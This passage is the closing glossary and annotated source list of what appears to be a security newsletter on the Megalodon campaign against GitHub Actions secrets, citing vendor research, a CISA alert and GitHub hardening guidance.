**<span class="glossary-term" data-bs-toggle="tooltip" title="Instance Metadata Service. The link-local HTTP endpoint (169.254.169.254 on AWS and Azure, metadata.google.internal on GCP) that hands out cloud credentials to workloads running on a VM.">IMDS</span> (Instance Metadata Service):** A local endpoint (`169.254.169.254`) available on cloud VM instances (and CI runners) that provides instance metadata including temporary credentials for attached IAM roles or managed identities.

**Ephemeral runner:** A <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> runner that is created fresh for each job and destroyed afterward, leaving no persistent state on the host. This limits forensic recovery of runner-side evidence post-execution.

**SafeDep:** Open-source supply chain security research organisation that first catalogued the Megalodon campaign commits and published the public dataset `megalodon-campaign-commits.csv`.

---

## Sources & Further Reading

### Primary Research

- [Megalodon: Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Repositories](https://www.stepsecurity.io/blog/megalodon-mass-github-actions-secret-exfiltration-across-5-500-public-repositories) — StepSecurity, May 22, 2026. Full technical breakdown including payload decode, workflow variants, and runner-level detection screenshots.

- [Megalodon: New CI/CD Malware Spreads Across GitHub, Infecting ~5,000+ Repositories](https://www.ox.security/blog/megalodon-cicd-malware-github/) — OX Security, May 21, 2026. Independent infection analysis confirming 3,500+ infected YAML files via base64 payload search; regex pattern decode.

### CI/CD Attack Taxonomy

- [GitHub Actions Supply Chain Attack: tj-actions/changed-files Incident](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) — Palo Alto Unit 42. Analysis of the 2025 tj-actions compromise that traced back to a Coinbase-targeted campaign; essential background on how <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> tag poisoning enables supply chain compromise.

- [Popular GitHub Action Tags Redirected to Imposter Commit to Steal CI/CD Credentials](https://thehackernews.com/2026/05/github-actions-supply-chain-attack.html) — The Hacker News, May 2026. Coverage of the broader pattern of Actions tag redirection attacks preceding Megalodon.

- [Supply Chain Compromises Impact Nx Console and GitHub Repositories](https://www.cisa.gov/news-events/alerts/2026/05/28/supply-chain-compromises-impact-nx-console-and-github-repositories) — CISA Alert, May 28, 2026. Official advisory covering GitHub supply chain compromises including the Nx Console incident; actionable hardening guidance.

### Defensive Tooling and Guidance

- [GitHub Actions 2026 Security Roadmap](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) — GitHub Blog. GitHub's own roadmap for Actions security controls including improved egress restriction and workflow pinning enforcement.

- [Securing the Open Source Supply Chain Across GitHub](https://github.blog/security/supply-chain-security/securing-the-open-source-supply-chain-across-github/) — GitHub Blog. Platform-level controls available to maintainers and organisations for hardening the Actions attack surface.

- [GitHub Actions Supply Chain Security Hardening Guide 2026](https://www.buildmvpfast.com/blog/github-actions-supply-chain-security-hardening-guide-2026) — Practical configuration reference for <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub repository setting that gates which actors and commit shapes are allowed to update a protected branch. Bypass-actor allow-lists are a recurring source of supply-chain compromise.">branch protection</span>, action pinning, and egress restriction in <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> workflows.

---

*Next week (rotation: Cloud → Supply-Chain → <span class="glossary-term" data-bs-toggle="tooltip" title="Advanced Persistent Threat, a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period.">APT</span> → Threat-Intel): A deep dive into the most recently attributed <span class="glossary-term" data-bs-toggle="tooltip" title="Advanced Persistent Threat, a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period.">APT</span> campaign — concrete <span class="glossary-term" data-bs-toggle="tooltip" title="Tactics, Techniques, and Procedures, the behavior of a threat actor. A tactic is the highest-level description of this behavior, while techniques give a more detailed description of behavior in the context of a tactic, and procedures an even lower-level, highly detailed description in the context of a technique.">TTPs</span>, victim sector telemetry, and <span class="glossary-term" data-bs-toggle="tooltip" title="Kusto Query Language. The query language used by Microsoft Sentinel, Azure Log Analytics, and Defender for hunting and detection across telemetry.">KQL</span> detections for <span class="glossary-term" data-bs-toggle="tooltip" title="Security Operations Center. The team and tooling responsible for monitoring, detecting, and responding to security events across an organization.">SOC</span> teams.*
